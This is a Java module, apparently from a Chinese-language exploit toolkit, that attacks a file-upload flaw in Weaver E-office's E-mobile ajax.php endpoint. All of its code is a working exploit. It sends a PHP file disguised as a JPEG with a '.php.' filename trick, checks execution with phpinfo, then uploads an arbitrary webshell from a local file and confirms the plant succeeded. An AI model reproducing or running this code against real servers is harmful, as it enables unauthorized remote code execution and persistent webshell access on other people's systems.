package exp.oa.weaveroa.eoffice;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.*;

import java.util.Date;
import java.util.HashMap;

public class weaver_eo_Ajax_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attgetshell(url,cmd,textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try {
            long tt = (new Date()).getTime();
            String filename = tt+".php.";
            HttpTools res = new HttpTools();
            HashMap head = new HashMap<>();
            head.put("Cache-Control", "max-age=0");
            head.put("Origin", "null");
            head.put("Upgrade-Insecure-Requests", "1");
            head.put("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
            head.put("Accept-Encoding", "gzip, deflate");
            head.put("Accept-Language", "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7");
            head.put("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt");

            String data = "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n" +
                    "Content-Disposition: form-data; name=\"upload_quwan\"; filename=\""+filename+"\r\n" +
                    "Content-Type: image/jpeg\r\n" +
                    "\r\n" +
                    "<?php phpinfo();?>\r\n" +
                    "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "\r\n" +
                    "\r\n" +
                    "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--";


            Response post_resp = res.post(url + "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save",data,head ,"utf-8");

            if ( post_resp.getCode() == 200 && post_resp.getText().contains("[1,")) {
                String target = url+"/"+ getIndexOf.getMessage(post_resp.getText().replace("\\",""),"attachment",0,".php.",5);
                Response get_resp = res.get(target,new HashMap<>(),"UTF-8");
                if(get_resp.getCode()==200 && get_resp.getText().contains("phpinfo")) {
                    Platform.runLater(() -> {
                        textArea.appendText("\n [ weaver_eo_Ajax_upload ]");

                        textArea.appendText("\n 文件上传成功: " + target);

                        textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                        textArea.appendText("\n");
                    });


                    return true;
                }
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private boolean attgetshell(String url,String pass,TextArea textArea){
        try {

            String shell_payload = Methods.readFile(pass);
            long tt = (new Date()).getTime();
            String payload = tt+"\n" + shell_payload;
            String filename = tt+".php.";
            HttpTools res = new HttpTools();
            HashMap head = new HashMap<>();
            head.put("Cache-Control", "max-age=0");
            head.put("Upgrade-Insecure-Requests", "1");
            head.put("Origin", "null");
            head.put("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
            head.put("Accept-Encoding", "gzip, deflate");
            head.put("Accept-Language", "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7");
            head.put("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt");

            String data = "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n" +
                    "Content-Disposition: form-data; name=\"upload_quwan\"; filename=\""+filename+"\"\r\n" +
                    "Content-Type: image/jpeg\r\n" +
                    "\r\n" +
                    payload+
                    "\r\n" +
                    "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "\r\n" +
                    "\r\n" +
                    "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--";


            Response post_resp = res.post(url + "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save",data,head ,"utf-8");

            if ( post_resp.getCode() != 404 && post_resp.getText().contains("[1,")) {
                String target = url+"/"+ getIndexOf.getMessage(post_resp.getText().replace("\\",""),"attachment",0,".php.",5);
                Response get_resp = res.get(target,new HashMap<>(),"UTF-8");
                if(get_resp.getCode()==200 && get_resp.getText().contains(tt+"")) {
                    Platform.runLater(() -> {
                        textArea.appendText("\n webshell文件上传成功");
                    });
                    return true;
                }


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败");
                textArea.appendText("\n 连接异常！！！");
            });
        }

        return false;
    }

}
